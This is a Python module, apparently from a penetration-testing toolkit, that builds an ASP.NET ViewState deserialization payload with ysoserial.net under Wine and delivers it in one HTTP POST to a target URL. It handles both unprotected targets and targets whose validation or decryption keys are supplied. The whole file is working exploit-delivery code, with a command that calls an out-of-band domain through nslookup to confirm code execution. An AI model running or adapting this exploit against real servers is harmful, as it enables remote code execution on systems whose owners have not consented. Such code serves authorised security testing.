"""
Subprocess + HTTP execution for deserialization_probe_dotnet: generates
one ASP.NET ViewState gadget-chain payload with ysoserial.net (run under
Wine, since ysoserial.net targets .NET Framework v4.7.2 -- confirmed via
its own .csproj -- which Linux Mono cannot run the ViewState plugin
under at all; confirmed empirically on CT 115: identical
NullReferenceException inside ViewStatePlugin.Run regardless of gadget
or argument combination under Mono, while Wine + a real .NET Framework
4.7.2 install via winetricks runs both modes below cleanly), then
delivers it in exactly one HTTP POST as the __VIEWSTATE form field.

Two generation modes, both confirmed against the real installed binary:
- Unprotected (no validation_key given): ysoserial.net's top-level
  mode, no -p plugin at all -- `-g <gadget> -f LosFormatter -o base64`.
  Confirmed the command embeds in plaintext in the decoded payload
  (real captured output in tests), matching a target with
  EnableViewStateMac=false.
- Keyed (validation_key given): the -p ViewState plugin, which needs
  --showraw to avoid double URL-encoding -- ysoserial.net URL-encodes
  its ViewState-plugin output by default, and requests' own form-data
  encoding would encode it a second time when POSTing otherwise.

Confirmation is never synchronous -- see parse.py's module docstring.
No internal interactsh client here either, same reasoning as the Java
deserialization_probe's own execute.py.
"""
from __future__ import annotations

import os
import shutil
import subprocess
from typing import List, Optional, Tuple

import requests
import urllib3

from tradecraft.adapters.deserialization_probe_dotnet import parse as dpd_parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Env overrides, same env-override-then-conventional-path shape
# phpggc's find_script()/deserialization_probe's find_jar() already
# use. Defaults match the real CT 115 install (mono-complete installed
# but unused by this adapter -- Wine handles both modes; see this
# module's own docstring for why Mono alone can't run the ViewState
# plugin).
WINE_BIN_ENV = "YSOSERIAL_NET_WINE_BIN"
WINE_BIN_DEFAULT = "/usr/lib/wine/wine64"
YSOSERIAL_NET_EXE_ENV = "YSOSERIAL_NET_EXE"
YSOSERIAL_NET_EXE_DEFAULT = "/opt/ysoserial.net/ysoserial.exe"
WINEPREFIX_ENV = "YSOSERIAL_NET_WINEPREFIX"
WINEPREFIX_DEFAULT = "/root/.wine_ysoserial"

# Hard caps on this call's blast radius, independent of
# --allow-destructive: one payload generation, one HTTP POST, bounded
# subprocess/HTTP time, bounded payload size. The flag controls
# availability, not how much one call can do -- see docs/policy.md.
YSOSERIAL_NET_TIMEOUT_SECONDS = 60
HTTP_TIMEOUT_SECONDS = 15
MAX_PAYLOAD_CHARS = 262144

_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) tradecraft/1.0"
_VIEWSTATE_FIELD = "__VIEWSTATE"


def find_runtime() -> Optional[Tuple[str, str, str]]:
    """(wine_bin, ysoserial_exe, wineprefix) if all three exist, else
    None. A bootstrapped WINEPREFIX with a working .NET Framework
    install is as much a real dependency here as the exe/binary
    themselves -- without it ysoserial.net fails to load entirely
    (confirmed: a bare wine64 with no .NET Framework in the prefix
    produces zero output and exit 0 for even --help)."""
    wine_bin = os.environ.get(WINE_BIN_ENV) or WINE_BIN_DEFAULT
    if not (os.path.isfile(wine_bin) and os.access(wine_bin, os.X_OK)):
        resolved = shutil.which("wine64") or shutil.which("wine")
        if resolved:
            wine_bin = resolved
        else:
            return None
    exe = os.environ.get(YSOSERIAL_NET_EXE_ENV) or YSOSERIAL_NET_EXE_DEFAULT
    prefix = os.environ.get(WINEPREFIX_ENV) or WINEPREFIX_DEFAULT
    if not os.path.isfile(exe):
        return None
    if not os.path.isdir(prefix):
        return None
    return wine_bin, exe, prefix


def build_unprotected_argv(gadget: str, command: str) -> List[str]:
    """Top-level (no -p plugin) mode -- an unsigned, unencrypted
    payload for EnableViewStateMac=false targets. -f LosFormatter, not
    -f ObjectStateFormatter directly: confirmed against the real binary
    that no gadget here actually supports ObjectStateFormatter except
    ObjRef (which takes a URI, not a command) -- ysoserial.net's own
    --fullhelp text states LosFormatter's base64 output is directly
    usable as an ObjectStateFormatter/ViewState payload since no MAC
    key modifier distinguishes the two in this tool."""
    return ["-o", "base64", "-g", gadget, "-f", "LosFormatter", "-c", command]


def build_viewstate_argv(
    gadget: str,
    command: str,
    path: str,
    apppath: str,
    validation_algorithm: str,
    validation_key: str,
    decryption_algorithm: str = "",
    decryption_key: str = "",
) -> List[str]:
    """-p ViewState plugin mode -- a signed (and, if decryption_key is
    given, encrypted) payload. --showraw is mandatory here: confirmed
    against the real binary that this plugin's default output IS
    URL-encoded (unlike the top-level mode's plain base64), and
    delivering it as a requests form field would double-encode it."""
    argv = [
        "-p", "ViewState",
        "-g", gadget,
        "-c", command,
        f"--path={path}",
        f"--apppath={apppath}",
        f"--validationalg={validation_algorithm}",
        f"--validationkey={validation_key}",
    ]
    if decryption_key:
        argv.append(f"--decryptionalg={decryption_algorithm}")
        argv.append(f"--decryptionkey={decryption_key}")
    argv.append("--showraw")
    return argv


def generate_payload(
    wine_bin: str, exe: str, prefix: str, argv_tail: List[str],
) -> Tuple[str, Optional[str]]:
    """Runs ysoserial.net once under Wine. Returns (payload, error).

    Two distinct failure shapes, both confirmed against the real
    binary, neither distinguishable by exit code alone:
    - A real error (invalid gadget/plugin/missing option value) exits
      non-zero (255, Environment.Exit(-1) under both Mono and Wine)
      with the error text on stdout -- ysoserial.net never writes to
      stderr at all, confirmed directly.
    - Missing required arguments at the TOP LEVEL specifically (no
      -p plugin, and gadget/formatter/command end up empty) hits a
      different code path with no explicit Environment.Exit call --
      confirmed against the real binary: exit code 0, full --help text
      printed to stdout, prefixed by the literal line "Missing
      arguments. You may need to provide the command parameter even if
      it is being ignored." This adapter always supplies -g/-c/-f
      itself, so this shouldn't fire in practice, but it's checked
      explicitly rather than trusted away -- a success-shaped exit code
      must never be read as a real payload.
    """
    argv = [wine_bin, exe, *argv_tail]
    env = dict(os.environ)
    env["WINEPREFIX"] = prefix
    env["WINEDEBUG"] = "-all"
    env["DISPLAY"] = ""
    try:
        proc = subprocess.run(
            argv,
            capture_output=True,
            text=True,
            timeout=YSOSERIAL_NET_TIMEOUT_SECONDS,
            stdin=subprocess.DEVNULL,
            env=env,
        )
    except FileNotFoundError:
        return "", "wine executable not found"
    except subprocess.TimeoutExpired:
        return "", f"ysoserial.net payload generation timed out after {YSOSERIAL_NET_TIMEOUT_SECONDS}s"
    except OSError as exc:
        return "", f"ysoserial.net execution failed: {exc}"

    stdout = (proc.stdout or "").strip()

    if "Missing arguments" in stdout:
        return "", "ysoserial.net reported missing arguments despite this adapter's own argv"

    if proc.returncode != 0 or not stdout:
        first_line = stdout.splitlines()[0] if stdout else "no output"
        return "", f"ysoserial.net payload generation failed (exit {proc.returncode}): {first_line}"

    if len(stdout) > MAX_PAYLOAD_CHARS:
        return "", (
            f"generated payload is {len(stdout)} chars, over the "
            f"{MAX_PAYLOAD_CHARS}-char cap for one call"
        )
    return stdout, None


def deliver(url: str, payload: str, session: Optional[requests.Session] = None) -> Tuple[Optional[int], Optional[str]]:
    """Exactly one POST, __VIEWSTATE form field, no retries. Returns
    (status_code, error)."""
    close_session = False
    if session is None:
        session = requests.Session()
        close_session = True
    try:
        resp = session.post(
            url,
            data={_VIEWSTATE_FIELD: payload},
            headers={"User-Agent": _USER_AGENT},
            timeout=HTTP_TIMEOUT_SECONDS,
            verify=False,
            allow_redirects=False,
        )
        return resp.status_code, None
    except requests.RequestException as exc:
        return None, str(exc)
    finally:
        if close_session:
            session.close()


def execute(
    target: str,
    oob_domain: str,
    payload_type: str = "",
    validation_key: str = "",
    validation_algorithm: str = "",
    decryption_key: str = "",
    decryption_algorithm: str = "",
    path: str = "",
    apppath: str = "",
    session: Optional[requests.Session] = None,
) -> dpd_parse.RawDeserializationProbeDotnetResult:
    url = dpd_parse.normalize_target_url(target)
    if not url:
        return dpd_parse.RawDeserializationProbeDotnetResult(error="empty target URL")

    domain, domain_error = dpd_parse.validate_oob_domain(oob_domain)
    if domain_error:
        return dpd_parse.RawDeserializationProbeDotnetResult(target=url, error=domain_error)

    gadget, gadget_error = dpd_parse.validate_gadget(payload_type)
    if gadget_error:
        return dpd_parse.RawDeserializationProbeDotnetResult(target=url, oob_domain=domain, error=gadget_error)

    v_key, v_key_error = dpd_parse.validate_hex_key(validation_key, "validation_key")
    if v_key_error:
        return dpd_parse.RawDeserializationProbeDotnetResult(
            target=url, gadget=gadget, oob_domain=domain, error=v_key_error,
        )
    d_key, d_key_error = dpd_parse.validate_hex_key(decryption_key, "decryption_key")
    if d_key_error:
        return dpd_parse.RawDeserializationProbeDotnetResult(
            target=url, gadget=gadget, oob_domain=domain, error=d_key_error,
        )

    runtime = find_runtime()
    if not runtime:
        return dpd_parse.RawDeserializationProbeDotnetResult(
            target=url, gadget=gadget, oob_domain=domain,
            error="ysoserial.net runtime not available (wine64, ysoserial.exe, or its WINEPREFIX missing)",
        )
    wine_bin, exe, prefix = runtime

    command = f"nslookup {domain}"
    mode = "keyed" if v_key else "unprotected"

    if mode == "unprotected":
        argv_tail = build_unprotected_argv(gadget, command)
    else:
        v_alg, v_alg_error = dpd_parse.validate_validation_algorithm(validation_algorithm)
        if v_alg_error:
            return dpd_parse.RawDeserializationProbeDotnetResult(
                target=url, mode=mode, gadget=gadget, oob_domain=domain, error=v_alg_error,
            )
        d_alg, d_alg_error = dpd_parse.validate_decryption_algorithm(decryption_algorithm)
        if d_alg_error:
            return dpd_parse.RawDeserializationProbeDotnetResult(
                target=url, mode=mode, gadget=gadget, oob_domain=domain, error=d_alg_error,
            )
        resolved_path = path.strip() if path and path.strip() else dpd_parse.derive_path(url)
        resolved_apppath = apppath.strip() if apppath and apppath.strip() else dpd_parse.DEFAULT_APPPATH
        argv_tail = build_viewstate_argv(
            gadget, command, resolved_path, resolved_apppath,
            v_alg, v_key, d_alg, d_key,
        )

    payload, gen_error = generate_payload(wine_bin, exe, prefix, argv_tail)
    if gen_error:
        return dpd_parse.RawDeserializationProbeDotnetResult(
            target=url, mode=mode, gadget=gadget, oob_domain=domain, error=gen_error,
        )

    status_code, http_error = deliver(url, payload, session=session)

    return dpd_parse.RawDeserializationProbeDotnetResult(
        target=url,
        mode=mode,
        gadget=gadget,
        oob_domain=domain,
        payload=payload,
        status_code=status_code,
        http_error=http_error,
    )
